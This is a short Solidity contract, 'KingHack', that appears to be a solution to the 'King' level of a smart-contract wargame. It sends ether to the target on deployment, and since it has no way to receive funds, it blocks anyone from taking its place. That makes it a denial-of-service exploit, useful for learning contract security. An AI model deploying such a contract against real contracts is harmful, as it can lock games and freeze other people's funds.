// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {King} from "./King.sol";

contract KingHack {
    error TransferFailed();

    constructor(address payable _target) payable {
        (bool success,) = _target.call{value: msg.value}("");
        if (!success) revert TransferFailed();
    }
}
